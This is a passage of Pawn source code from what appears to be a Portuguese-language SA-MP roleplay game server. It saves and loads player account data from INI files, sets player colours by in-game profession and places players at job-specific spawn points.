	 NewX = StartPosX + (dist * floatsin(alpha, degrees));
	 NewY = StartPosY + (dist * floatcos(alpha, degrees));
}

stock SalvarFSS(playerid)
{
	if(pInfo[playerid][Logado] == true)
	{
		format(arquivos2, sizeof(arquivos2), PastaFSS, PlayerName(playerid));
		if(WE_FileExists(arquivos2))
		{
			WE_SetInt(arquivos2, "Fome", GetPVarInt(playerid,"Fome"));
			WE_SetInt(arquivos2, "Sede", GetPVarInt(playerid,"Sede"));
			WE_SetInt(arquivos2, "Sono", GetPVarInt(playerid,"Sono"));
			WE_SaveFile();
		}
	}
}

stock SalvarFile(playerid)
{
	if(pInfo[playerid][Logado] == true)
	{
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "Dinheiro", GetPlayerCash(playerid));
		WE_SetInt(gFile, "ContaBanco", pInfo[playerid][ContaBanco]);
		WE_SetInt(gFile, "Profissao", pInfo[playerid][Prof]);
		if(pInfo[playerid][fardado] == 0)
		{
			WE_SetInt(gFile, "Skin", GetPlayerSkin(playerid));
		}
		WE_SetInt(gFile, "Sexo", pInfo[playerid][Sexo]);
		WE_SetInt(gFile, "Exp", pInfo[playerid][Exp]);
		WE_SetInt(gFile, "SegUP", pInfo[playerid][SegUP]);
		WE_SetInt(gFile, "MinUP", pInfo[playerid][MinUP]);
		WE_SetInt(gFile, "Level", pInfo[playerid][Level]);
		WE_SetInt(gFile, "Gasolina", pInfo[playerid][Gas]);
		WE_SetInt(gFile, "HabTCarro", pInfo[playerid][HabTCarro]);
		WE_SetInt(gFile, "HabTMoto", pInfo[playerid][HabTMoto]);
		WE_SetInt(gFile, "HabTCaminhao", pInfo[playerid][HabTCaminhao]);
		WE_SetInt(gFile, "HabTTrem", pInfo[playerid][HabTTrem]);
		WE_SetInt(gFile, "HabNBarco", pInfo[playerid][HabNBarco]);
		WE_SetInt(gFile, "HabAHeli", pInfo[playerid][HabAHeli]);
		WE_SetInt(gFile, "HabAAviao", pInfo[playerid][HabAAviao]);
		WE_SetInt(gFile, "Procurado", GetPlayerWantedLevel(playerid));
		WE_SetInt(gFile, "Preso", pInfo[playerid][Preso]);
		WE_SetInt(gFile, "T_Cocaina", pInfo[playerid][Pego_QtaCoca]);
		WE_SetInt(gFile, "T_Maconha", pInfo[playerid][Pego_QtaMaco]);
		WE_SetInt(gFile, "T_Crack", pInfo[playerid][Pego_QtaCrac]);
		WE_SetInt(gFile, "P_Cocaina", pInfo[playerid][PT_Cocaina]);
		WE_SetInt(gFile, "P_Maconha", pInfo[playerid][PT_Maconha]);
		WE_SetInt(gFile, "P_Crack", pInfo[playerid][PT_Crack]);
		WE_SetInt(gFile, "Tem_GPS", pInfo[playerid][Tem_GPS]);
		WE_SetInt(gFile, "Tem_RelogioUP", pInfo[playerid][Tem_RelogioUP]);
		WE_SetInt(gFile, "Cor_Relogio", pInfo[playerid][RelogioCor]);
		WE_SetInt(gFile, "RelogioONOFF", pInfo[playerid][R_UP_ON_OFF]);
	    WE_SetInt(gFile, "Tem_Velocimetro", pInfo[playerid][Tem_Velocimetro]);
	    WE_SetInt(gFile, "Velo_ON_OFF", pInfo[playerid][VelocimetroO_F]);
	    WE_SetInt(gFile, "Tem_Cura", pInfo[playerid][Tem_Cura]);
	    WE_SetInt(gFile, "Kit", pInfo[playerid][Tem_Kit]);
	   	WE_SetInt(gFile, "Matou", pInfo[playerid][fMatou]);
		WE_SetInt(gFile, "Morreu", pInfo[playerid][fMorreu]);
		WE_SetInt(gFile, "Creditos", pInfo[playerid][Celular_c]);
		WE_SetInt(gFile, "Cargo", pCargo[playerid]);
		WE_SetInt(gFile, "Patente", pPatente[playerid]);
		WE_SetInt(gFile, "Assaltos", pAssalto[playerid]);
		WE_SetInt(gFile, "Bombas", pBombas[playerid]);
		WE_SetInt(gFile, "RemovidoPolicia", IsNotCop[playerid]);
		WE_SetInt(gFile, "ViaFacilCount", ViaFacil[playerid]);
		// 'Posições Continuar'
		new
			Float:POS_[4]
		;
		GetPlayerPos(playerid, POS_[0], POS_[1], POS_[2]);
		GetPlayerFacingAngle(playerid, POS_[3]);
		WE_SetFloat(gFile, "Cx", POS_[0]);
		WE_SetFloat(gFile, "Cy", POS_[1]);
		WE_SetFloat(gFile, "Cz", POS_[2]);
		WE_SetFloat(gFile, "Cw", POS_[3]);
		WE_SetInt(gFile, "Ci", GetPlayerInterior(playerid));
		new
			Float:s_vida
		;
		GetPlayerHealth(playerid, s_vida);
		WE_SetFloat(gFile, "Vida", s_vida);
	    // 'Admin / Mod'
	    aInfo[playerid][AdminL] = 0;
	    aInfo[playerid][Admin] = 0;
	    aInfo[playerid][Moderador] = 0;
	    aInfo[playerid][Ajudante] = 0;
	    aInfo[playerid][Corregedor] = 0;
	    SetPVarInt(playerid, "pAdminL", 0);
	 	SetPVarInt(playerid, "pAdmin", 0);
	 	SetPVarInt(playerid, "pModer", 0);
	 	SetPVarInt(playerid, "pAjud", 0);
	 	SetPVarInt(playerid, "pCorreg", 0);
	 	// 'Clã'
	 	//format(playerClan[playerid], MAX_PLAYER_NAME+1, " ");
	 	//clanColor[playerid] = -1;
	 	pInfo[playerid][Abuser] = 0;
	 	WE_SaveFile();
	}
}

stock CarregarFile(playerid)
{
	format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	pInfo[playerid][ContaBanco] = WE_GetInt(gFile, "ContaBanco");
	pInfo[playerid][Prof] = WE_GetInt(gFile, "Profissao");
	pInfo[playerid][Sexo] = WE_GetInt(gFile, "Sexo");
	pInfo[playerid][SkinP] = WE_GetInt(gFile, "Skin");
	pInfo[playerid][Exp] = WE_GetInt(gFile, "Exp");
	pInfo[playerid][Level] = WE_GetInt(gFile, "Level");
	pInfo[playerid][MinUP] = WE_GetInt(gFile, "MinUP");
	pInfo[playerid][SegUP] = WE_GetInt(gFile, "SegUP");
	pInfo[playerid][Gas] = WE_GetInt(gFile, "Gasolina");
	pInfo[playerid][HabTCarro] = WE_GetInt(gFile, "HabTCarro");
	pInfo[playerid][HabTMoto] = WE_GetInt(gFile, "HabTMoto");
	pInfo[playerid][HabTCaminhao] = WE_GetInt(gFile, "HabTCaminhao");
	pInfo[playerid][HabTTrem] = WE_GetInt(gFile, "HabTTrem");
	pInfo[playerid][HabNBarco] = WE_GetInt(gFile, "HabNBarco");
	pInfo[playerid][HabAHeli] = WE_GetInt(gFile, "HabAHeli");
	pInfo[playerid][HabAAviao] = WE_GetInt(gFile, "HabAAviao");
	pInfo[playerid][Preso] = WE_GetInt(gFile, "Preso");
	pInfo[playerid][Abuser] = WE_GetInt(gFile, "Abuser");
 	pInfo[playerid][Pego_QtaCoca] = WE_GetInt(gFile, "T_Cocaina");
 	pInfo[playerid][Pego_QtaMaco] = WE_GetInt(gFile, "T_Maconha");
 	pInfo[playerid][Pego_QtaCrac] = WE_GetInt(gFile, "T_Crack");
 	pInfo[playerid][PT_Cocaina] = WE_GetInt(gFile, "P_Cocaina");
 	pInfo[playerid][PT_Maconha] = WE_GetInt(gFile, "P_Maconha");
 	pInfo[playerid][PT_Crack] = WE_GetInt(gFile, "P_Crack");
 	pInfo[playerid][Tem_GPS] = WE_GetInt(gFile, "Tem_GPS");
  	pInfo[playerid][Tem_RelogioUP] = WE_GetInt(gFile, "Tem_RelogioUP");
  	pInfo[playerid][RelogioCor] = WE_GetInt(gFile, "Cor_Relogio");
  	pInfo[playerid][R_UP_ON_OFF] = WE_GetInt(gFile, "RelogioONOFF");
  	pInfo[playerid][Tem_Velocimetro] = WE_GetInt(gFile, "Tem_Velocimetro");
  	pInfo[playerid][VelocimetroO_F] = WE_GetInt(gFile, "Velo_ON_OFF");
	pInfo[playerid][Tem_Cura] = WE_GetInt(gFile, "Tem_Cura");
	pInfo[playerid][Tem_Kit] = WE_GetInt(gFile, "Kit");
	pInfo[playerid][Tem_Capacete] = WE_GetInt(gFile, "Tem_Capact");
	pInfo[playerid][ModeloCapacete] = WE_GetInt(gFile, "ModeloCapacete");
	pInfo[playerid][Jetpack] = WE_GetInt(gFile, "Jetpack");
	pInfo[playerid][fMatou] = WE_GetInt(gFile, "Matou");
	pInfo[playerid][fMorreu] = WE_GetInt(gFile, "Morreu");
	pInfo[playerid][PLAYER_VIP] = WE_GetInt(gFile, "PLAYER_VIP");
	pInfo[playerid][Seguro] = WE_GetInt(gFile, "Seguro");
	pInfo[playerid][Convenio] = WE_GetInt(gFile, "Convenio");
	pInfo[playerid][Celular] = WE_GetInt(gFile, "Celular");
	pInfo[playerid][Celular_c] = WE_GetInt(gFile, "Creditos");
	pInfo[playerid][Spawn] = WE_GetInt(gFile, "Spawn");
	pInfo[playerid][Casa] = WE_GetInt(gFile, "Casa");
	pCargo[playerid] = WE_GetInt(gFile, "Cargo");
	pPatente[playerid] = WE_GetInt(gFile, "Patente");
	pAssalto[playerid] = WE_GetInt(gFile, "Assaltos");
	pBombas[playerid] = WE_GetInt(gFile, "Bombas");
	IsNotCop[playerid] = WE_GetInt(gFile, "RemovidoPolicia");
	ViaFacil[playerid] = WE_GetInt(gFile, "ViaFacilCount");
	pInfo[playerid][Pistolas] = WE_GetInt(gFile, "SkPistol");
	pInfo[playerid][Shotguns] = WE_GetInt(gFile, "SkShotgun");
	pInfo[playerid][Micros] = WE_GetInt(gFile, "SkMicro");
	pInfo[playerid][SubMG] = WE_GetInt(gFile, "SkMP5");
	pInfo[playerid][Rifles] = WE_GetInt(gFile, "SkRifle");
	pInfo[playerid][Sniper] = WE_GetInt(gFile, "SkSniper");

	if(pInfo[playerid][Casa] < 1 && pInfo[playerid][Spawn] != 0)
	{
	    pInfo[playerid][Spawn] = 0;
	    WE_SetInt(gFile, "Spawn", 0);
	}
	if(pInfo[playerid][Casa] >= 1)
	{
        format(gStr, sizeof(gStr), "Casas/casa%d.ini", pInfo[playerid][Casa]);
        if(fexist(gStr))
        {
			if(!strcmp(CasaInfo[pInfo[playerid][Casa]][Proprietario], PlayerName(playerid), true))
			{
			    pInfo[playerid][Spawn] = 1;
			    WE_SetInt(gFile, "Spawn", 1);
			}
        }
        else
		{
		    pInfo[playerid][Spawn] = 0;
		    WE_SetInt(gFile, "Spawn", 0);
		}
	}
	else if(pInfo[playerid][Casa] < 1)
	{
	    new
	        MoradorCID = WE_GetInt(gFile, "MorandoID")
		;
		if(MoradorCID >= 1)
		{
		    format(gStr, sizeof(gStr), "Casas/casa%d.ini", MoradorCID);
		}
        if(fexist(gStr))
        {
			if(!strcmp(CasaInfo[MoradorCID][Morador], PlayerName(playerid), true) || !strcmp(CasaInfo[MoradorCID][Morador2], PlayerName(playerid), true) || !strcmp(CasaInfo[MoradorCID][Morador3], PlayerName(playerid), true))
			{
			    pInfo[playerid][Spawn] = 1;
			    WE_SetInt(gFile, "Spawn", 1);
			}
        }
        else
		{
		    pInfo[playerid][Spawn] = 0;
		    WE_SetInt(gFile, "Spawn", 0);
		}
	}
	SetPlayerScore(playerid, WE_GetInt(gFile, "Level"));
	sGivePlayerCash(playerid, WE_GetInt(gFile, "Dinheiro"));
	SetPlayerWantedLevel(playerid, WE_GetInt(gFile, "Procurado"));
	//SetPlayerSkin(playerid, WE_GetInt(gFile, "Skin"));
	if(WE_GetInt(gFile, "Luta") == 1)
	{
		SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
	}
	else if(WE_GetInt(gFile, "Luta") == 2)
	{
		SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
	}
	else if(WE_GetInt(gFile, "Luta") == 3)
	{
		SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
	}
	else if(WE_GetInt(gFile, "Luta") == 4)
	{
		SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
	}
	else if(WE_GetInt(gFile, "Luta") == 5)
	{
		SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
	}
	// 'Admin / Mod'
	aInfo[playerid][Admin] = WE_GetInt(gFile, "Administrador");
	aInfo[playerid][Moderador] = WE_GetInt(gFile, "Moderador");
	aInfo[playerid][Ajudante] = WE_GetInt(gFile, "Ajudante");
    aInfo[playerid][Corregedor] = WE_GetInt(gFile, "Corregedor");
    aInfo[playerid][AdminL] = WE_GetInt(gFile, "AdminL");
	SetPVarInt(playerid, "pAdmin", aInfo[playerid][Admin]);
	SetPVarInt(playerid, "pModer", aInfo[playerid][Moderador]);
	SetPVarInt(playerid, "pAjud", aInfo[playerid][Ajudante]);
	SetPVarInt(playerid, "pCorreg", aInfo[playerid][Corregedor]);
	SetPVarInt(playerid, "pAdminL", aInfo[playerid][AdminL]);
	// 'Posições Continuar'
	pInfo[playerid][ContX] = WE_GetFloat(gFile, "Cx");
	pInfo[playerid][ContY] = WE_GetFloat(gFile, "Cy");
	pInfo[playerid][ContZ] = WE_GetFloat(gFile, "Cz");
	pInfo[playerid][ContW] = WE_GetFloat(gFile, "Cw");
	pInfo[playerid][ContI] = WE_GetInt(gFile, "Ci");
	new
	  	Float:vida = WE_GetFloat(gFile, "Vida")
  	;
  	if(vida > 5.0)
  	{
		SetPlayerHealth(playerid, vida);
	}
	else
	{
	    SetPlayerHealth(playerid, 5.0);
	}
	// 'Organização'
	oInfo[playerid][ORG_ID] = WE_GetInt(gFile, "oID");
	oInfo[playerid][Lider] = WE_GetInt(gFile, "Lider");
    oInfo[playerid][SubLider] = WE_GetInt(gFile, "SubLider");
    oInfo[playerid][Membro] = WE_GetInt(gFile, "Membro");
	// 'Clã'
	/*format(pFile, sizeof(pFile), "clans/%s.ini", PlayerName(playerid));
	if(fexist(pFile))
	{
	    format(playerClan[playerid], MAX_PLAYER_NAME+1, WE_GetString(pFile, "cla"));
	    format(gStr, sizeof(gStr), "clans/%s.ini", playerClan[playerid]);
		clanColor[playerid] = WE_GetInt(gStr, "Color");
	}
	else if(!fexist(pFile))
	{
		format(playerClan[playerid], MAX_PLAYER_NAME+1, " ");
		clanColor[playerid] = -1;
	}*/
	new s[5];
	if(pInfo[playerid][PLAYER_VIP] == 1)
	{
		s = "Sim";
	}
	else
	{
		s = "Nao";
	}
	format(gstring, sizeof(gstring), "_"); //pInfo[playerid][Level], pInfo[playerid][Casa], playerClan[playerid]
	TextDrawSetString(InfoLevel[playerid], gstring);
}

stock SetColor(playerid)
{
	if(pInfo[playerid][Prof] == DESEMPREGADO)
	    SetPlayerColor(playerid, COR_DESEMPREGADO);
    else if(pInfo[playerid][Prof] == MOTORISTA_ONIBUS)
  		SetPlayerColor(playerid, COR_MOTORISTABUS);
    else if(pInfo[playerid][Prof] == TAXISTA)
     	SetPlayerColor(playerid, COR_TAXISTA);
    else if(pInfo[playerid][Prof] == MOTO_TAXISTA)
    	SetPlayerColor(playerid, COR_MOTOTAXI);
    else if(pInfo[playerid][Prof] == PILOTO_PART)
    	SetPlayerColor(playerid, COR_PILOTOPAR);
    else if(pInfo[playerid][Prof] == CAMINHONEIRO)
    	SetPlayerColor(playerid, COR_CAMINHONEIRO);
    else if(pInfo[playerid][Prof] == MAQUINISTA)
    	SetPlayerColor(playerid, COR_MAQUINISTA);
    else if(pInfo[playerid][Prof] == TRANSPORTADOR)
    	SetPlayerColor(playerid, COR_TRANSPORTADOR);
    else if(pInfo[playerid][Prof] == SEGURANCA_PART)
    	SetPlayerColor(playerid, COR_SEGPART);
    else if(pInfo[playerid][Prof] == MOTORISTA_PART)
    	SetPlayerColor(playerid, COR_MOTPART);
    else if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
    	SetPlayerColor(playerid, COR_GUARDTRANS);
    else if(pInfo[playerid][Prof] == POL_CIVIL)
    	SetPlayerColor(playerid, COR_POLCIVIL);
    else if(pInfo[playerid][Prof] == POL_MILITAR)
    	SetPlayerColor(playerid, COR_POLMILITAR);
    else if(pInfo[playerid][Prof] == POL_RODOVIARIO)
    	SetPlayerColor(playerid, COR_POLRODOVIARIO);
    else if(pInfo[playerid][Prof] == POL_FEDERAL)
    	SetPlayerColor(playerid, COR_POLFEDERAL);
    else if(pInfo[playerid][Prof] == JUIZ)
    	SetPlayerColor(playerid, COR_JUIZ);
    else if(pInfo[playerid][Prof] == TRAF_DROGAS)
    	SetPlayerColor(playerid, COR_TRAFDROGAS);
    else if(pInfo[playerid][Prof] == TRAF_ARMAS)
    	SetPlayerColor(playerid, COR_TRAFARMAS);
    else if(pInfo[playerid][Prof] == HITMAN)
    	SetPlayerColor(playerid, COR_HITMAN);
    else if(pInfo[playerid][Prof] == ATIRADOR)
    	SetPlayerColor(playerid, COR_ATIRADOR);
    else if(pInfo[playerid][Prof] == TERRORISTA)
    	SetPlayerColor(playerid, COR_TERRORISTA);
    else if(pInfo[playerid][Prof] == CHEFE_MAFIA)
    	SetPlayerColor(playerid, COR_CHEFEMAFIA);
    else if(pInfo[playerid][Prof] == SEG_ILHA)
    	SetPlayerColor(playerid, COR_SEGILHA);
    else if(pInfo[playerid][Prof] == PORT_ILHA)
    	SetPlayerColor(playerid, COR_PORILHA);
    else if(pInfo[playerid][Prof] == PIZZABOY)
    	SetPlayerColor(playerid, COR_PIZZABOY);
    else if(pInfo[playerid][Prof] == FOTOGRAFO)
    	SetPlayerColor(playerid, COR_FOTOGRAFO);
    else if(pInfo[playerid][Prof] == REPORTER)
    	SetPlayerColor(playerid, COR_REPORTER);
    else if(pInfo[playerid][Prof] == DEPUTADO)
    	SetPlayerColor(playerid, COR_DEPUTADO);
    else if(pInfo[playerid][Prof] == PREFEITO)
    	SetPlayerColor(playerid, COR_PREFEITO);
    else if(pInfo[playerid][Prof] == GOVERNADOR)
    	SetPlayerColor(playerid, COR_GOVERNADOR);
    else if(pInfo[playerid][Prof] == EXERCITO)
    	SetPlayerColor(playerid, COR_EXERCITO);
    else if(pInfo[playerid][Prof] == INSTRUTOR)
    	SetPlayerColor(playerid, COR_INSTRUTOR);
    else if(pInfo[playerid][Prof] == MECANICO)
    	SetPlayerColor(playerid, COR_MECANICO);
    else if(pInfo[playerid][Prof] == PESCADOR)
    	SetPlayerColor(playerid, COR_PESCADOR);
    else if(pInfo[playerid][Prof] == PILOTO)
    	SetPlayerColor(playerid, COR_PILOTO);
    else if(pInfo[playerid][Prof] == MEDICO)
    	SetPlayerColor(playerid, COR_MEDICO);
    else if(pInfo[playerid][Prof] == ADVOGADO)
    	SetPlayerColor(playerid, COR_ADVOGADO);
    else if(pInfo[playerid][Prof] == VENDEDOR_SKINS)
    	SetPlayerColor(playerid, COR_VENDEDORSKINS);
    else if(pInfo[playerid][Prof] == FRENTISTA)
    	SetPlayerColor(playerid, COR_FRENTISTA);
    else if(pInfo[playerid][Prof] == PADRE)
    	SetPlayerColor(playerid, COR_PADRE);
    else if(pInfo[playerid][Prof] == PROSTITUTA)
    	SetPlayerColor(playerid, COR_PROSTITUTA);
    else if(pInfo[playerid][Prof] == SEG_VILA)
    	SetPlayerColor(playerid, COR_SEGVILA);
    else if(pInfo[playerid][Prof] == PORT_VILA)
    	SetPlayerColor(playerid, COR_PORVILA);
    else if(pInfo[playerid][Prof] == CONTRABANDISTA)
    	SetPlayerColor(playerid, COR_CONTRABANDISTA);
	else if(pInfo[playerid][Prof] == BOMBEIRO)
		SetPlayerColor(playerid, COR_BOMBEIRO);
}

stock SpawnProf(playerid)
{
	if(pInfo[playerid][Prof] == DESEMPREGADO)
	{
	    new rnd = random(sizeof(SpawnNovato));
		SetPlayerColor(playerid, COR_DESEMPREGADO);
		SetPlayerPos(playerid, SpawnNovato[rnd][0], SpawnNovato[rnd][1], SpawnNovato[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnNovato[rnd][3]);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MOTORISTA_ONIBUS)
	{
		new rnd = random(sizeof(SpawnMotoBus));
		SetPlayerPos(playerid, SpawnMotoBus[rnd][0], SpawnMotoBus[rnd][1], SpawnMotoBus[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnMotoBus[rnd][3]);
		SetPlayerColor(playerid, COR_MOTORISTABUS);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == TAXISTA)
	{
		new rnd = random(sizeof(SpawnTaxistas));
		SetPlayerPos(playerid, SpawnTaxistas[rnd][0], SpawnTaxistas[rnd][1], SpawnTaxistas[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnTaxistas[rnd][3]);
		SetPlayerColor(playerid, COR_TAXISTA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == CAMINHONEIRO)
	{
		new rnd = random(sizeof(SpawnCaminhoneiros));
		SetPlayerPos(playerid, SpawnCaminhoneiros[rnd][0], SpawnCaminhoneiros[rnd][1], SpawnCaminhoneiros[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnCaminhoneiros[rnd][3]);
		SetPlayerColor(playerid, COR_CAMINHONEIRO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == TRANSPORTADOR)
	{
		SetPlayerPos(playerid, -1716.5294, 5.9419, 3.6768);
		SetPlayerFacingAngle(playerid, 314.5974);
		SetPlayerColor(playerid, COR_TRANSPORTADOR);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == TRAF_DROGAS)
	{
		new rnd = random(sizeof(SpawnTraficDorgas));
		SetPlayerPos(playerid, SpawnTraficDorgas[rnd][0], SpawnTraficDorgas[rnd][1], SpawnTraficDorgas[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnTraficDorgas[rnd][3]);
		SetPlayerColor(playerid, COR_TRAFDROGAS);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == TRAF_ARMAS)
	{
		new rnd = random(sizeof(SpawnTraficArmas));
		SetPlayerPos(playerid, SpawnTraficArmas[rnd][0], SpawnTraficArmas[rnd][1], SpawnTraficArmas[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnTraficArmas[rnd][3]);
		SetPlayerColor(playerid, COR_TRAFARMAS);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == CHEFE_MAFIA)
	{
		new rnd = random(sizeof(SpawnChefeMafia));
		SetPlayerPos(playerid, SpawnChefeMafia[rnd][0], SpawnChefeMafia[rnd][1], SpawnChefeMafia[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnChefeMafia[rnd][3]);
		SetPlayerColor(playerid, COR_CHEFEMAFIA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == EXERCITO)
	{
		new rnd = random(sizeof(SpawnExerxito));
		SetPlayerPos(playerid, SpawnExerxito[rnd][0], SpawnExerxito[rnd][1], SpawnExerxito[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnExerxito[rnd][3]);
		SetPlayerColor(playerid, COR_EXERCITO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MEDICO)
	{
		new rnd = random(sizeof(SpawnMedico));
		SetPlayerPos(playerid, SpawnMedico[rnd][0], SpawnMedico[rnd][1], SpawnMedico[rnd][2]);
		SetPlayerFacingAngle(playerid, SpawnMedico[rnd][3]);
		SetPlayerColor(playerid, COR_MEDICO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == PESCADOR)
	{
		SetPlayerPos(playerid, 446.9689,-1879.2867,3.2256);
		SetPlayerFacingAngle(playerid, 180.8393);
		SetPlayerColor(playerid, COR_PESCADOR);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == SEGURANCA_PART)
	{
		SetPlayerPos(playerid, 1220.8730,-1654.9575,11.7969+3);
		SetPlayerFacingAngle(playerid, 271.4151);
		SetPlayerColor(playerid, COR_SEGPART);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MOTORISTA_PART)
	{
		SetPlayerPos(playerid, 1293.5533,-1214.4510,19.3720+3);
		SetPlayerFacingAngle(playerid, 267.9876);
		SetPlayerColor(playerid, COR_MOTPART);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MOTO_TAXISTA)
	{
		SetPlayerPos(playerid, 1791.9552,-1869.7761,13.5673);
		SetPlayerFacingAngle(playerid, 357.9466);
		SetPlayerColor(playerid, COR_MOTOTAXI);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == PILOTO_PART)
	{
		SetPlayerPos(playerid, 1976.4111,1774.4590,12.1121);
		SetPlayerFacingAngle(playerid, 135.4301);
		SetPlayerColor(playerid, COR_PILOTOPAR);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MAQUINISTA)
	{
		SetPlayerPos(playerid, 1686.0665,-1968.3176,14.1172);
		SetPlayerFacingAngle(playerid, 269.4521);
		SetPlayerColor(playerid, COR_MAQUINISTA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == HITMAN)
	{
		SetPlayerPos(playerid, -1665.4401,2484.9216,87.1547);
		SetPlayerFacingAngle(playerid, 281.3561);
		SetPlayerColor(playerid, COR_HITMAN);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == ATIRADOR)
	{
		SetPlayerPos(playerid, 2230.6968,-1120.5590,48.7500);
		SetPlayerFacingAngle(playerid, 61.8766);
		SetPlayerColor(playerid, COR_ATIRADOR);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == TERRORISTA)
	{
		SetPlayerPos(playerid, -378.0573,2242.0767,42.6185);
		SetPlayerFacingAngle(playerid, 106.2302);
		SetPlayerColor(playerid, COR_TERRORISTA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == PORT_ILHA)
	{
		SetPlayerPos(playerid, 835.3889,-2060.5396,12.8672);
		SetPlayerFacingAngle(playerid, 357.8696);
		SetPlayerColor(playerid, COR_PORILHA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == SEG_ILHA)
	{
		SetPlayerPos(playerid, 832.3940,-2520.9224,28.3489);
		SetPlayerFacingAngle(playerid, 358.3842);
		SetPlayerColor(playerid, COR_SEGILHA);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == PIZZABOY)
	{
		SetPlayerPos(playerid, 2104.3772,-1810.1393,13.5547);
		SetPlayerFacingAngle(playerid, 2.6313);
		SetPlayerColor(playerid, COR_PIZZABOY);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == FOTOGRAFO)
	{
		SetPlayerPos(playerid, 2338.1501,1724.3357,10.8203);
		SetPlayerFacingAngle(playerid, 147.9959);
		SetPlayerColor(playerid, COR_FOTOGRAFO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == REPORTER)
	{
		SetPlayerPos(playerid, 737.6852,-1357.6514,13.5000);
		SetPlayerFacingAngle(playerid, 270.7092);
		SetPlayerColor(playerid, COR_REPORTER);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == INSTRUTOR)
	{
		SetPlayerPos(playerid, -2023.2615,-100.6966,35.1641);
		SetPlayerFacingAngle(playerid, 89.5622);
		SetPlayerColor(playerid, COR_INSTRUTOR);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MECANICO)
	{
		SetPlayerPos(playerid, 1708.7620,-1793.4124,14.6142);
		SetPlayerFacingAngle(playerid, 179.6228);
		SetPlayerColor(playerid, COR_MECANICO);
        SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == MEDICO)
	{
		SetPlayerPos(playerid, 1178.3401,-1323.4166,14.1152);
		SetPlayerFacingAngle(playerid, 270.8000);
		SetPlayerColor(playerid, COR_MEDICO);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == PADRE)
	{
		SetPlayerPos(playerid, 2232.3843,-1333.1102,23.9815);
		SetPlayerFacingAngle(playerid, 90.5004);
		SetPlayerColor(playerid, COR_PADRE);
		SetPlayerInterior(playerid, 0);
		pInfo[playerid][EntrouL] = false;
	}
	if(pInfo[playerid][Prof] == VENDEDOR_SKINS)
	{
	    SetPlayerInterior(playerid, 1);
		SetPlayerPos(playerid, 203.6846,-40.3285,1001.8047);
		SetPlayerFacingAngle(playerid, 179.1196);
		SetPlayerColor(playerid, COR_VENDEDORSKINS);
		pInfo[playerid][EntrouL] = true;
	}
	if(pInfo[playerid][Prof] == FRENTISTA)
	{
		SetPlayerPos(playerid, 1236.5800,-1220.2324,13.7964+2);
		SetPlayerFacingAngle(playerid, 269.4490);
		SetPlayerColor(playerid, COR_FRENTISTA);
		SetPlayerInterior(playerid, 0);
